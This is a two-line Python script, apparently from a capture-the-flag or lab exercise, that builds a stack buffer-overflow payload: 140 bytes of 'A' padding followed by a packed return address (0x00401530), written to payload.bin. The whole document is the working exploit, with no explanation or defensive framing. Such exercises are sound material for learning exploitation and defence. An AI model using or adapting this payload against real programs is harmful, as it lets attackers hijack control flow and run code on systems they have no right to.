payload = b"A" * 140 + b"0\x15@\x00"
open("payload.bin", "wb").write(payload)